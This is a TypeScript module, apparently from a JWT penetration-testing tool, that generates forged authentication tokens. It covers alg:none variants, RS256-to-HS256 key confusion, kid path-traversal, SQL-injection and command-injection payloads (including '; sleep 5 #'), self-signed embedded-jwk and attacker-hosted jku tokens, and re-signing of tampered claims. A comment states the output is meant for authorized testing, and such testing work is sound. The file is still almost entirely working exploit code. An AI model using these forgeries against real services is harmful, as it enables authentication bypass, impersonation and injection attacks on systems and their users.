import { bytesToBase64Url, stringToBase64Url } from "./base64url";
import { asymmetricSign, generateRsaKeyPair, hmacSign } from "./crypto";
import { algFamily, assembleToken, type DecodedJwt } from "./jwt";

/**
 * Attack-token generators. Each returns one or more forged tokens plus a
 * short note. NOTHING here sends a request — the user runs the output from
 * their own authorized environment.
 */

export interface GeneratedToken {
  label: string;
  token: string;
  note?: string;
}

function reencode(
  header: Record<string, unknown>,
  payload: Record<string, unknown>,
): string {
  return `${stringToBase64Url(JSON.stringify(header))}.${stringToBase64Url(
    JSON.stringify(payload),
  )}`;
}

// ── alg:none family ─────────────────────────────────────────────────────────

export function generateAlgNone(decoded: DecodedJwt): GeneratedToken[] {
  const variants = ["none", "None", "nOnE", "NONE", "nonE"];
  return variants.map((alg) => {
    const header = { ...decoded.header, alg };
    const signingInput = reencode(header, decoded.payload);
    return {
      label: `alg: ${alg}`,
      token: assembleToken(signingInput, ""),
      note: "Empty signature segment. Tests servers that don't reject 'none'.",
    };
  });
}

// ── Algorithm confusion (RS256 → HS256) ─────────────────────────────────────

export async function generateAlgConfusion(
  decoded: DecodedJwt,
  publicKeyPem: string,
  hmacAlg: "HS256" | "HS384" | "HS512" = "HS256",
): Promise<GeneratedToken[]> {
  // The classic attack: use the verbatim public key bytes as the HMAC secret.
  // Most server libs feed the PEM string (including header/footer/newlines)
  // to the HMAC, so we sign with the exact text the user pasted.
  const header = { ...decoded.header, alg: hmacAlg };
  const signingInput = reencode(header, decoded.payload);
  const results: GeneratedToken[] = [];

  // Variant A: PEM as-is (most common).
  const sigPem = await hmacSign(hmacAlg, publicKeyPem, signingInput);
  results.push({
    label: `${hmacAlg} signed with public key (PEM as-is)`,
    token: assembleToken(signingInput, sigPem),
    note: "HMAC secret = the pasted PEM text verbatim (incl. -----BEGIN----- lines).",
  });

  // Variant B: PEM with a trailing newline (some libs read the file with \n).
  const sigPemNl = await hmacSign(hmacAlg, publicKeyPem.trimEnd() + "\n", signingInput);
  results.push({
    label: `${hmacAlg} signed with public key (PEM + trailing \\n)`,
    token: assembleToken(signingInput, sigPemNl),
    note: "Same, but with a trailing newline — matches how many servers load key files.",
  });

  return results;
}

// ── kid injection ───────────────────────────────────────────────────────────

export interface KidPayloads {
  pathTraversal: string;
  sqli: string;
  commandInjection: string;
}

export const DEFAULT_KID_PAYLOADS: KidPayloads = {
  pathTraversal: "../../../../../../dev/null",
  sqli: "' UNION SELECT 'attacker-controlled-key'-- -",
  commandInjection: "; sleep 5 #",
};

/**
 * Generate kid-injection variants. For path traversal to `/dev/null`, the
 * effective key is empty, so we sign with an empty HMAC secret — a real,
 * working forgery against servers that resolve kid to a file.
 */
export async function generateKidInjection(
  decoded: DecodedJwt,
  payloads: KidPayloads,
): Promise<GeneratedToken[]> {
  const results: GeneratedToken[] = [];
  const baseAlg = typeof decoded.header.alg === "string" ? decoded.header.alg : "HS256";
  const hmacAlg = algFamily(baseAlg) === "HMAC" ? baseAlg : "HS256";

  // /dev/null trick: key file contents are empty → HMAC key is "".
  {
    const header = { ...decoded.header, alg: hmacAlg, kid: payloads.pathTraversal };
    const signingInput = reencode(header, decoded.payload);
    const sig = await hmacSign(hmacAlg, "", signingInput);
    results.push({
      label: `kid path-traversal → ${payloads.pathTraversal}`,
      token: assembleToken(signingInput, sig),
      note: "Signed with an EMPTY HMAC key — works if kid resolves to an empty/zero file like /dev/null.",
    });
  }

  // SQLi and command-injection: signature can't be predicted (key unknown),
  // so we keep the original signature — the value is the injected kid itself.
  for (const [label, kid] of [
    ["kid SQL injection", payloads.sqli],
    ["kid command injection", payloads.commandInjection],
  ] as const) {
    const header = { ...decoded.header, kid };
    const signingInput = reencode(header, decoded.payload);
    results.push({
      label,
      token: assembleToken(signingInput, decoded.raw.signature),
      note: "Original signature kept; the payload is the injected kid value. Observe server errors / timing.",
    });
  }

  return results;
}

// ── jwk / jku / x5u self-signed injection ───────────────────────────────────

export interface JwkInjectionResult {
  tokens: GeneratedToken[];
  /** Attacker private key (PEM) the user must keep to reproduce signing. */
  privateKeyPem: string;
  /** Public JWK embedded / to be hosted. */
  publicJwk: JsonWebKey;
}

export async function generateJwkInjection(
  decoded: DecodedJwt,
  jkuUrlPlaceholder: string,
): Promise<JwkInjectionResult> {
  const { publicJwk, privatePkcs8Pem, privateKey } = await generateRsaKeyPair();
  const kid = "attacker-key-1";
  const jwkForHeader = { ...publicJwk, kid, use: "sig", alg: "RS256" };

  const tokens: GeneratedToken[] = [];

  // Embedded jwk
  {
    const header = {
      ...decoded.header,
      alg: "RS256",
      kid,
      jwk: jwkForHeader,
    };
    delete (header as Record<string, unknown>).jku;
    delete (header as Record<string, unknown>).x5u;
    const signingInput = reencode(header, decoded.payload);
    const sig = await signWithKey(privateKey, signingInput);
    tokens.push({
      label: "Embedded jwk (self-signed)",
      token: assembleToken(signingInput, sig),
      note: "Token carries the attacker's public key in the header and is signed with the matching private key.",
    });
  }

  // jku pointer
  {
    const header = {
      ...decoded.header,
      alg: "RS256",
      kid,
      jku: jkuUrlPlaceholder,
    };
    delete (header as Record<string, unknown>).jwk;
    delete (header as Record<string, unknown>).x5u;
    const signingInput = reencode(header, decoded.payload);
    const sig = await signWithKey(privateKey, signingInput);
    tokens.push({
      label: "jku pointer (attacker-hosted JWKS)",
      token: assembleToken(signingInput, sig),
      note: `Host a JWKS containing the public key below at ${jkuUrlPlaceholder} (with kid="${kid}").`,
    });
  }

  return { tokens, privateKeyPem: privatePkcs8Pem, publicJwk: jwkForHeader };
}

async function signWithKey(key: CryptoKey, signingInput: string): Promise<string> {
  const enc = new TextEncoder();
  const sig = await crypto.subtle.sign(
    { name: "RSASSA-PKCS1-v1_5" },
    key,
    enc.encode(signingInput),
  );
  return bytesToBase64Url(new Uint8Array(sig));
}

// ── Claim tampering (re-sign with chosen key/secret) ─────────────────────────

export interface TamperResult {
  token: string;
  signed: boolean;
  note: string;
}

export async function generateTamperedToken(
  header: Record<string, unknown>,
  payload: Record<string, unknown>,
  keyMaterial: string,
): Promise<TamperResult> {
  const alg = typeof header.alg === "string" ? header.alg : "none";
  const family = algFamily(alg);
  const signingInput = reencode(header, payload);

  if (family === "none") {
    return {
      token: assembleToken(signingInput, ""),
      signed: false,
      note: "Unsigned (alg:none).",
    };
  }
  if (!keyMaterial.trim()) {
    return {
      token: assembleToken(signingInput, ""),
      signed: false,
      note: "No key/secret provided — token left UNSIGNED. Provide one to re-sign.",
    };
  }
  if (family === "HMAC") {
    const sig = await hmacSign(alg, keyMaterial, signingInput);
    return {
      token: assembleToken(signingInput, sig),
      signed: true,
      note: `Re-signed with HMAC (${alg}) using the provided secret.`,
    };
  }
  // RSA / PS / ECDSA — needs a private key.
  const sig = await asymmetricSign(alg, keyMaterial, signingInput);
  return {
    token: assembleToken(signingInput, sig),
    signed: true,
    note: `Re-signed with ${alg} using the provided private key.`,
  };
}
